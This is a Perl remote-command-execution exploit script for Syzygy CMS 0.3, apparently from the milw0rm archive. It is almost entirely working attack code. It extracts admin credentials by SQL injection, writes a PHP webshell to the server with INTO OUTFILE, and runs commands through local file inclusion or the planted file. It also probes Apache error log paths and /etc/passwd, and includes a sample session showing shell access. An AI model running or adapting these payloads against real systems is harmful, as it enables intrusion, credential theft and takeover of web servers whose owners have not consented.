#!/usr/bin/perl

# Web App : Syzygy CMS 0.3
# Link    : http://sourceforge.net/project/downloading.php?group_id=103298&use_mirror=heanet&filename=syzygycms-0.3.tar.gz&a=89932245
# Remote Command Execution Exploit :
# Case 1: If LFI works, exploitation via Shell Injection + LFI
# Case 2: Unless, exploitation via SQL Command Injection

# by Giovanni Buzzin, Osirys
# osirys[at]autistici[dot]org
# osirys.org
# Greets: Drosophila

# ----------------------------------------------------------------------------
# Exploit Simulation // (Case 1)
# ----------------------------------------------------------------------------
# osirys[~]>$ perl sploit.txt http://localhost/syzygy/

#   ---------------------------------
#       Syzygy CMS 0.3 RCE sploit
#               by Osirys
#   ---------------------------------

# [*] Getting admin login details ..
# [$] User: admin
# [$] Pass: 5f4dcc3b5aa765d61d8327deb882cf99

# [*] Testing LFI vulnerability
# [*] LFI works, exploiting it via SQL-LFI

# [++] Exploiting via SQL-LFI !
# [*] Creating remote Shell via SQL Injection ..
# [*] Spawning remote Shell via LFI ..

# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/syzygy
# shell[localhost]$> exit
# [-] Quitting ..
# osirys[~]>$
# ----------------------------------------------------------------------------

use IO::Socket;
use LWP::UserAgent;

my $host  = $ARGV[0];
my $rand  = int(rand 50);
my $lfi   = "/index.php?page=../../../../../../../../../";
my $code = "<?php echo \"0xExec\";system(\$_GET[cmd]);echo \"ExeCx0\" ?>";
my $file = "/tmp/sh_spawn_ownzzzzz".$rand.".txt";
my @error_logs  =  qw(
                      /var/log/httpd/error.log
                      /var/log/httpd/error_log
                      /var/log/apache/error.log
                      /var/log/apache/error_log
                      /var/log/apache2/error.log
                      /var/log/apache2/error_log
                      /logs/error.log
                      /var/log/apache/error_log
                      /var/log/apache/error.log
                      /usr/local/apache/logs/error_log
                      /etc/httpd/logs/error_log
                      /etc/httpd/logs/error.log
                      /var/www/logs/error_log
                      /var/www/logs/error.log
                      /usr/local/apache/logs/error.log
                      /var/log/error_log
                      /apache/logs/error.log
                    );

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

print "[*] Getting admin login details ..\n";

my $url = $host."/index.php?page=poll.php&poll=-1 union select 1,concat(0x64657461696C73,username,0x3a,password,0x64657461696C73),0,0,0,0,0,0,0,0,0,0,0,0,0,0 from users";
my $re = get_req($url);
if ($re =~ /details(.+):(.+)details/) {
    my($user,$pass) = ($1,$2);
    print "[\$] User: $user\n";
    print "[\$] Pass: $pass\n";
}
else {
    print "[-] Can't extract admin details\n\n";
}

print "\n[*] Testing LFI vulnerability\n";
my $re = get_req($host.$lfi."etc/passwd%00");
if ($re !~ /root:x/) {
    print "[-] LFI seems not working, exploiting it via SQL Command Injection !\n";
    &exploit_2;
}
else {
    print "[*] LFI works, exploiting it via SQL-LFI\n";
    &exploit_1;
}

sub exploit_1 {
    print "\n[++] Exploiting via SQL-LFI !\n[*] Creating remote Shell via SQL Injection ..\n";
    my $attack  = $host."/index.php?page=poll.php&poll=-1 union select 1,'".$code."',0,0,0,0,0,0,0,0,0,0,0,0,0,0 into outfile '".$file."'";
    get_req($attack);

    print "[*] Spawning remote Shell via LFI ..\n\n";
    $way = 1;
    &exec_cmd;
}

sub exploit_2 {
    print "\n[++] Exploiting via SQL Command Injection !\n[*] Generating error through GET request ..\n";
    get_req($host."/osirys_log_test".$rand);

    print "[*] Cheeking Apache Error Log path ..\n";

    while (($log = <@error_logs>)&&($gotcha != 1)) {
        $tmp_path = $host."/index.php?page=poll.php&poll=-1 union select 1,load_file('".$log."'),0,0,0,0,0,0,0,0,0,0,0,0,0,0";
        $re = get_req($tmp_path);
        if ($re =~ /File does not exist: (.+)\/osirys_log_test$rand/) {
            $site_path = $1."/";
            $gotcha = 1;
            print "[*] Error Log path found -> $log\n";
            print "[*] Website path found -> $site_path\n";
        }
    }

    $gotcha == 1 || die "[-] Couldn't file error_log !\n";

    my $attack  = $host."/index.php?page=poll.php&poll=-1 union select 1,'".$code."',0,0,0,0,0,0,0,0,0,0,0,0,0,0 into outfile '".$site_path."/files/1337.php'";
    get_req($attack);
    my $test = get_req($host."/files/1337.php");
    if ($test =~ /0xExec/) {
        print "[*] Shell succesfully injected !\n";
        print "[&] Hi my master, do your job now [!]\n\n";
        $exec_path = $host."/shell.php";
        $way = 2;
        &exec_cmd;
    }
    else {
        print "[-] Shell not found \n[-] Exploit failed\n\n";
        exit(0);
    }
}

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    if ($way == 1) {
        $exec_url = $host.$lfi.$file."%00&cmd=".$cmd;
    }
    elsif ($way == 2) {
        $exec_url = $host."/files/1337.php?cmd=".$cmd;
    }
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ /0xExec(.+)ExeCx0/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return($response->content);
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.+)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.+)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return($full_det);
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  --------------------------------- \n".
          "      Syzygy CMS 0.3 RCE sploit     \n".
          "              by Osirys             \n".
          "  --------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad hostname! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

# milw0rm.com [2009-03-23]